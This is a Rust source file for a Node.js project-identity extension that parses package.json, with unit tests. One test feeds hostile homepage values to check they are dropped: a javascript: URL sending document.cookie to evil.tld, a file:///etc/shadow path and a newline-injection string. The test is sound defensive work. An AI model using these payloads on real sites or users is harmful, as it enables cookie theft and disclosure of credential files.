//! Node.js stack `project_identity` + `project_units` providers.
//!
//! Parses `package.json` for name, version, description, license, authors,
//! homepage, repository, and engine. npm/yarn workspaces come from the
//! `workspaces` field; pnpm workspaces come from `pnpm-workspace.yaml`.
//!
//! Parse and read errors fall back to defaults; non-NotFound read errors and
//! parse errors are reported via `tracing` (`debug!` / `warn!`) so a malformed
//! manifest does not silently look like a missing one.

#![cfg_attr(
    test,
    allow(
        clippy::unwrap_used,
        clippy::cast_possible_truncation,
        clippy::cast_precision_loss,
        clippy::cast_sign_loss
    )
)]

// The four modules below are private, so every `pub` item inside them is
// crate-internal already — that spelling, rather than `pub(crate)`, is what
// `clippy::redundant_pub_crate` enforces workspace-wide. The crate's exported
// surface is `AboutNodeExtension` alone.
mod package_json;
mod package_manager;
mod repo_url;
mod units;

use ops_about::identity::{provide_identity_from_manifest, ParsedManifest};
use ops_core::project_identity::{base_about_fields, insert_homepage_field, AboutFieldDef};
use ops_extension::{Context, DataProvider, DataProviderError, ExtensionType};

use package_json::{parse_package_json, PackageJson};
use package_manager::detect_package_manager;

const NAME: &str = "about-node";
const DESCRIPTION: &str = "Node project identity";
const SHORTNAME: &str = "about-node";
const DATA_PROVIDER_NAME: &str = "project_identity";

/// Datasource extension supplying the Node stack's about providers
/// (identity and units, read from `package.json`) to the generic
/// `ops_about` renderers.
#[non_exhaustive]
pub struct AboutNodeExtension;

ops_extension::impl_extension! {
    AboutNodeExtension,
    name: NAME,
    description: DESCRIPTION,
    shortname: SHORTNAME,
    types: ExtensionType::DATASOURCE,
    stack: Some(ops_extension::Stack::Node),
    data_provider_name: Some(DATA_PROVIDER_NAME),
    register_data_providers: |_self, registry| {
        let _ = registry.register(DATA_PROVIDER_NAME, Box::new(NodeIdentityProvider));
        let _ = registry.register(units::PROVIDER_NAME, Box::new(units::NodeUnitsProvider));
    },
    factory: NODE_ABOUT_FACTORY = |_, _| {
        Some((NAME, Box::new(AboutNodeExtension)))
    },
}

struct NodeIdentityProvider;

impl DataProvider for NodeIdentityProvider {
    fn name(&self) -> &'static str {
        DATA_PROVIDER_NAME
    }

    fn about_fields(&self) -> Vec<AboutFieldDef> {
        let mut fields = base_about_fields();
        insert_homepage_field(&mut fields);
        fields
    }

    fn provide(&self, ctx: &mut Context) -> Result<serde_json::Value, DataProviderError> {
        provide_identity_from_manifest(ctx.working_directory(), |root| {
            let PackageJson {
                name,
                version,
                description,
                license,
                homepage,
                repository,
                authors,
                engines_node,
                has_packagemanager,
            } = parse_package_json(root).unwrap_or_default();

            let pkg_manager = detect_package_manager(root, has_packagemanager.as_deref());
            let stack_detail = build_stack_detail(engines_node.as_deref(), pkg_manager);

            // The packages row carries the count of the same resolved
            // workspace members the units provider lists (npm/yarn
            // `workspaces` or `pnpm-workspace.yaml`), read through the shared
            // manifest cache. A single-package project — no workspaces
            // declaration — keeps `None`, so the row stays hidden.
            let members = units::resolved_members(root);
            let module_count = (!members.is_empty()).then_some(members.len());

            ParsedManifest::build(|m| {
                m.name = name;
                m.version = version;
                m.description = description;
                m.license = license;
                m.authors = authors;
                m.homepage = homepage;
                m.repository = repository;
                m.stack_label = "Node";
                m.stack_detail = stack_detail;
                m.module_label = "packages";
                m.module_count = module_count;
            })
        })
    }
}

/// Compose the `stack_detail` string from optional Node engine version and
/// optional package-manager label.
fn build_stack_detail(engine_node: Option<&str>, pkg_manager: Option<&str>) -> Option<String> {
    match (engine_node, pkg_manager) {
        (Some(v), Some(pm)) => Some(format!("Node {v} · {pm}")),
        (Some(v), None) => Some(format!("Node {v}")),
        (None, Some(pm)) => Some(pm.to_string()),
        (None, None) => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use ops_core::project_identity::ProjectIdentity;

    // The fixture-writing helper lives once in `ops_about::test_support`;
    // alias it so call sites keep the short name.
    use ops_about::test_support::write_file as write;

    #[test]
    fn build_stack_detail_both_set() {
        assert_eq!(
            build_stack_detail(Some(">=18"), Some("pnpm")),
            Some("Node >=18 · pnpm".to_string())
        );
    }

    #[test]
    fn build_stack_detail_engine_only() {
        assert_eq!(
            build_stack_detail(Some(">=18"), None),
            Some("Node >=18".to_string())
        );
    }

    #[test]
    fn build_stack_detail_pm_only() {
        assert_eq!(
            build_stack_detail(None, Some("pnpm")),
            Some("pnpm".to_string())
        );
    }

    #[test]
    fn build_stack_detail_neither() {
        assert_eq!(build_stack_detail(None, None), None);
    }

    #[test]
    fn provider_name() {
        assert_eq!(NodeIdentityProvider.name(), "project_identity");
    }

    #[test]
    fn about_fields_include_homepage() {
        let fields = NodeIdentityProvider.about_fields();
        assert!(fields.iter().any(|f| f.id == "homepage"));
    }

    /// A hostile `homepage` must reach `ProjectIdentity.homepage` as `None`.
    /// Drives the full provider path
    /// (parse → `ParsedManifest` → deserialised identity) so the gate is
    /// pinned at the surface `crates/core/src/project_identity/card.rs`
    /// renders, not only inside the parser.
    #[test]
    fn provider_drops_hostile_homepage_from_identity() {
        for homepage in [
            // XSS sink.
            "javascript:fetch('https://evil.tld/?c='+document.cookie)",
            // Local resource disclosure.
            "file:///etc/shadow",
            // Forged extra line in the card / log records. Spelled with a
            // JSON `\n` escape so the file parses and the *deserialised*
            // value (a real LF) is what reaches the gate — a raw newline
            // inside a JSON string is invalid JSON and would never get that
            // far.
            "https://demo.dev\\nINJECT",
        ] {
            let dir = tempfile::tempdir().unwrap();
            write(
                &dir.path().join("package.json"),
                &format!("{{\"name\":\"x\",\"homepage\":\"{homepage}\"}}"),
            );
            let provider = NodeIdentityProvider;
            let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
            let id: ProjectIdentity =
                serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
            assert!(
                id.homepage.is_none(),
                "hostile homepage {homepage:?} must reach identity as None"
            );
            // The rest of the identity still flows: dropping one field is
            // degradation, not failure.
            assert_eq!(id.name, "x");
        }
    }

    /// A malformed `package.json` is parsed by both registered providers —
    /// and a third time for the identity card's package count — but must
    /// produce a single warn record naming the file, so an operator is not
    /// sent hunting for a second broken manifest that does not exist.
    #[test]
    fn malformed_package_json_warns_once_across_both_providers() {
        let dir = tempfile::tempdir().unwrap();
        write(&dir.path().join("package.json"), "{ \"name\": ");

        let (logs, ()) = ops_about::test_support::capture_tracing(tracing::Level::WARN, || {
            let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
            let _ = NodeIdentityProvider.provide(&mut ctx).unwrap();
            let _ = units::NodeUnitsProvider.provide(&mut ctx).unwrap();
        });

        assert_eq!(
            logs.matches("failed to parse package.json").count(),
            1,
            "expected exactly one parse-failure warn: {logs}"
        );
        assert!(
            logs.contains("recovery=\"defaults\""),
            "the warn must carry the recovery field: {logs}"
        );
    }

    #[test]
    fn parse_minimal_package_json() {
        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("package.json"),
            r#"{
  "name": "my-pkg",
  "version": "1.2.3",
  "description": "Demo package",
  "license": "MIT",
  "author": "Alice <a@example.com>",
  "homepage": "https://demo.dev",
  "repository": "github:user/repo"
}"#,
        );
        let provider = NodeIdentityProvider;
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let id: ProjectIdentity =
            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
        assert_eq!(id.name, "my-pkg");
        assert_eq!(id.version.as_deref(), Some("1.2.3"));
        assert_eq!(id.description.as_deref(), Some("Demo package"));
        assert_eq!(id.license.as_deref(), Some("MIT"));
        assert_eq!(id.stack_label, "Node");
        assert_eq!(id.module_label, "packages");
        // A single-package project (no workspaces declaration) keeps
        // `module_count = None` — the row stays hidden.
        assert_eq!(id.module_count, None);
        assert_eq!(id.homepage.as_deref(), Some("https://demo.dev"));
        assert_eq!(
            id.repository.as_deref(),
            Some("https://github.com/user/repo")
        );
        assert_eq!(id.authors, vec!["Alice <a@example.com>"]);
    }

    /// The identity card's `module_count` must equal the units provider's
    /// list length on the same fixture, for both workspace sources — npm/yarn
    /// `workspaces` and `pnpm-workspace.yaml`.
    #[test]
    fn workspace_module_count_equals_the_units_provider_length() {
        for (label, root_pkg, pnpm_yaml) in [
            (
                "npm workspaces",
                r#"{ "name": "root", "workspaces": ["packages/*"] }"#,
                None,
            ),
            (
                "pnpm-workspace.yaml",
                r#"{ "name": "root" }"#,
                Some("packages:\n  - 'packages/*'\n"),
            ),
        ] {
            let dir = tempfile::tempdir().unwrap();
            write(&dir.path().join("package.json"), root_pkg);
            if let Some(yaml) = pnpm_yaml {
                write(&dir.path().join("pnpm-workspace.yaml"), yaml);
            }
            write(
                &dir.path().join("packages/alpha/package.json"),
                r#"{ "name": "alpha", "version": "1.0.0" }"#,
            );
            write(
                &dir.path().join("packages/beta/package.json"),
                r#"{ "name": "beta", "version": "2.0.0" }"#,
            );
            // A directory under the glob with no package.json resolves to no
            // unit — and must not be counted.
            std::fs::create_dir_all(dir.path().join("packages/not-a-pkg")).unwrap();

            let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
            let identity: ProjectIdentity =
                serde_json::from_value(NodeIdentityProvider.provide(&mut ctx).unwrap()).unwrap();
            let units: Vec<ops_core::project_identity::ProjectUnit> =
                serde_json::from_value(units::NodeUnitsProvider.provide(&mut ctx).unwrap())
                    .unwrap();

            assert_eq!(units.len(), 2, "{label}: two members resolve, one does not");
            assert_eq!(
                identity.module_count,
                Some(units.len()),
                "{label}: the packages row must equal the units list length"
            );
        }
    }

    #[test]
    fn parse_author_object_and_contributors() {
        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("package.json"),
            r#"{
  "name": "x",
  "author": { "name": "Alice", "email": "a@example.com" },
  "contributors": [
    "Bob <b@example.com>",
    { "name": "Carol" }
  ]
}"#,
        );
        let provider = NodeIdentityProvider;
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let id: ProjectIdentity =
            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
        assert_eq!(
            id.authors,
            vec!["Alice <a@example.com>", "Bob <b@example.com>", "Carol"]
        );
    }

    #[test]
    fn parse_repository_object_with_git_plus_url() {
        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("package.json"),
            r#"{
  "name": "x",
  "repository": { "type": "git", "url": "git+https://github.com/o/r.git" }
}"#,
        );
        let provider = NodeIdentityProvider;
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let id: ProjectIdentity =
            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
        assert_eq!(id.repository.as_deref(), Some("https://github.com/o/r"));
    }

    #[test]
    fn detects_pnpm_via_workspace_file() {
        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("package.json"),
            r#"{ "name": "x", "engines": { "node": ">=18" } }"#,
        );
        write(
            &dir.path().join("pnpm-workspace.yaml"),
            "packages:\n  - 'packages/*'\n",
        );
        let provider = NodeIdentityProvider;
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let id: ProjectIdentity =
            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
        assert_eq!(id.stack_detail.as_deref(), Some("Node >=18 · pnpm"));
    }

    #[test]
    fn detects_yarn_via_lockfile() {
        let dir = tempfile::tempdir().unwrap();
        write(&dir.path().join("package.json"), r#"{ "name": "x" }"#);
        write(&dir.path().join("yarn.lock"), "# yarn\n");
        let provider = NodeIdentityProvider;
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let id: ProjectIdentity =
            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
        assert_eq!(id.stack_detail.as_deref(), Some("yarn"));
    }

    #[test]
    fn package_manager_field_takes_precedence() {
        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("package.json"),
            r#"{ "name": "x", "packageManager": "pnpm@9.0.0" }"#,
        );
        write(&dir.path().join("yarn.lock"), "");
        let provider = NodeIdentityProvider;
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let id: ProjectIdentity =
            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
        assert_eq!(id.stack_detail.as_deref(), Some("pnpm"));
    }

    #[test]
    fn fallback_to_dir_name_when_no_package_json() {
        let dir = tempfile::tempdir().unwrap();
        let provider = NodeIdentityProvider;
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let id: ProjectIdentity =
            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
        assert_eq!(id.stack_label, "Node");
        assert!(id.version.is_none());
    }

    #[test]
    fn git_remote_fallback_when_no_repository_field() {
        let dir = tempfile::tempdir().unwrap();
        write(&dir.path().join("package.json"), r#"{ "name": "x" }"#);
        let git_dir = dir.path().join(".git");
        std::fs::create_dir(&git_dir).unwrap();
        std::fs::write(
            git_dir.join("config"),
            "[remote \"origin\"]\n\turl = https://github.com/o/r.git\n",
        )
        .unwrap();
        let provider = NodeIdentityProvider;
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let id: ProjectIdentity =
            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
        assert_eq!(id.repository.as_deref(), Some("https://github.com/o/r"));
    }

    #[test]
    fn license_object_form() {
        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("package.json"),
            r#"{ "name": "x", "license": { "type": "Apache-2.0" } }"#,
        );
        let provider = NodeIdentityProvider;
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
        let id: ProjectIdentity =
            serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap();
        assert_eq!(id.license.as_deref(), Some("Apache-2.0"));
    }

    /// The `register_data_providers` closure is the crate's only wiring to
    /// the rest of `ops`, and both `registry.register` results are discarded
    /// with `let _ =` — under the registry's first-write-wins policy a name
    /// collision inside the closure would silently drop a provider. That
    /// discarded `Option` is not observable from outside the closure, so the
    /// closest pin is asserted instead: *both* keys must land, and each must
    /// answer with its own payload shape over a real fixture.
    #[test]
    fn extension_registers_both_providers_and_each_answers() {
        use ops_extension::{DataRegistry, Extension};

        let mut registry = DataRegistry::new();
        AboutNodeExtension.register_data_providers(&mut registry);
        assert_eq!(
            registry.provider_names(),
            vec!["project_identity", "project_units"],
            "both providers must land under distinct keys — a key collision \
             inside the closure would reject one with no failure anywhere"
        );

        let dir = tempfile::tempdir().unwrap();
        write(
            &dir.path().join("package.json"),
            r#"{ "name": "root", "workspaces": ["packages/*"] }"#,
        );
        write(
            &dir.path().join("packages/alpha/package.json"),
            r#"{ "name": "alpha", "version": "1.0.0" }"#,
        );
        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());

        let identity = registry
            .provide("project_identity", &mut ctx)
            .expect("identity provider must answer");
        assert_eq!(identity["stack_label"], serde_json::json!("Node"));

        let units = registry
            .provide("project_units", &mut ctx)
            .expect("units provider must answer");
        assert_eq!(
            units
                .as_array()
                .and_then(|a| a.first())
                .and_then(|u| u.get("name")),
            Some(&serde_json::json!("alpha")),
            "units payload must list the workspace member: {units}"
        );
    }

    /// `NODE_ABOUT_FACTORY` is the linkme entry the
    /// CLI discovers the extension through; assert it yields the extension
    /// with the declared metadata (name, shortname, stack, type). A stack
    /// mismatch here ships the Node providers under the wrong stack tag while
    /// every provider-level test stays green.
    #[test]
    fn factory_yields_the_node_about_extension_with_declared_metadata() {
        use ops_extension::Extension;

        let cfg = ops_core::config::Config::empty();
        let (name, ext) = (super::NODE_ABOUT_FACTORY)(&cfg, std::path::Path::new("."))
            .expect("factory must yield the extension");
        assert_eq!(name, NAME);
        assert_eq!(Extension::name(ext.as_ref()), "about-node");
        assert_eq!(ext.shortname(), SHORTNAME);
        assert_eq!(ext.stack(), Some(ops_extension::Stack::Node));
        assert!(ext.types().is_datasource());
        assert_eq!(ext.data_provider_name(), Some(DATA_PROVIDER_NAME));
    }
}
